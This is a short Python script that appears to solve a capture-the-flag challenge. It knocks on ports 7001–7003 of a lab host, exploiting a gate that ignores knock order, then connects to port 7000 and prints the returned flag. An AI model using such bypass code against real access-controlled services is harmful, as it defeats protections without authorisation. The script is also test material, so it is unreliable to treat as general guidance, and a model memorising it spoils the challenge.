"""The gate tracks knocked ports as a set, so touching all three in any order -- even a plain ascending scan -- unlocks it."""
import socket
import sys

HOST = 'app'
KNOCK_PORTS = (7001, 7002, 7003)
GATE_PORT = 7000


def knock(port):
    with socket.create_connection((HOST, port), timeout=5):
        pass


def main():
    for port in KNOCK_PORTS:
        knock(port)
    with socket.create_connection((HOST, GATE_PORT), timeout=5) as sock:
        sock.settimeout(5)
        reply = sock.recv(4096).decode('utf-8', 'replace').strip()
    if not reply.startswith('OK pwnden{'):
        print('the gate stayed locked: ' + reply, file=sys.stderr)
        raise SystemExit(3)
    print(reply[len('OK '):])


if __name__ == '__main__':
    main()
